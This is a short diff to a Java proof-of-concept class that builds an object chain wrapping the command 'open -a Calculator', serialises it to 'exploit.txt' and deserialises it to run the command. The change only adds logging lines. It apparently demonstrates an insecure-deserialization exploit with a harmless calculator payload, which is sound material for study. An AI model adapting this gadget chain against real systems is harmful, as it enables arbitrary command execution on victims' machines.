@@ -37,8 +37,9 @@ public class Main2 {
         TaskExecutor te = new TaskExecutor();
         CommandTask ct = new CommandTask(te, "open -a Calculator");
         CacheManager cm = new CacheManager(ct, "macOS", 0);
-
+        System.out.println("Saving exploit to file");
         save("exploit.txt", cm );
+        System.out.println("Loading exploit from file");
         load("exploit.txt");
     }
 }
